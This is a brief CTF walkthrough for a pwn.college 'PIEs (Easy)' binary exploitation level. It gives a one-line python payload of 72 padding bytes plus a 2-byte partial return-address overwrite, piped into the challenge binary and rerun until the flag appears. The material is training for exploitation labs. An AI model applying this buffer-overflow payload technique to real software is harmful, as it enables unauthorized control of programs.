# Stage 13: PIEs (Easy) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Easy |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-pie-overflow-w` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-pie-overflow-w`. Partial return-address overwrite: 72 bytes of `A` padding followed by the 2-byte tail `\xbb\x43` (little-endian `0x43bb`).

## Solution

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\xbb\x43")' | /challenge/binary-exploitation-pie-overflow-w
```

Note from the original run: run the following again and again until it gives you the flag.
